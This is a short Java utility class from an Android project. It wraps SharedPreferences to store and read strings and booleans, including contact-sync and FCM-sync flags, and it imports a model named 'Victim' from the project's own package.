package com.theah64.xrob.utils;

import android.content.Context;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;

import com.theah64.xrob.models.Victim;

/**
 * Created by theapache64 on 11/9/16.
 */
public class PrefUtils {

    public static final String KEY_IS_SYNC_CONTACTS = "is_sync_contacts";
    public static final String IS_FCM_SYNCED = "is_fcm_synced";
    private static PrefUtils instance;
    private final SharedPreferences sharedPref;

    private PrefUtils(Context context) {
        this.sharedPref = PreferenceManager.getDefaultSharedPreferences(context);
    }

    public static PrefUtils getInstance(Context context) {
        if (instance == null) {
            instance = new PrefUtils(context);
        }
        return instance;
    }

    public void saveString(final String key, final String value) {
        getEditor().putString(key, value).commit();
    }

    public SharedPreferences.Editor getEditor() {
        return sharedPref.edit();
    }

    public String getString(String key) {
        return this.sharedPref.getString(key, null);
    }

    public boolean getBoolean(String key) {
        return this.sharedPref.getBoolean(key, false);
    }

    public void saveBoolean(String key, Boolean value) {
        this.sharedPref.edit().putBoolean(key,value).commit();
    }
}
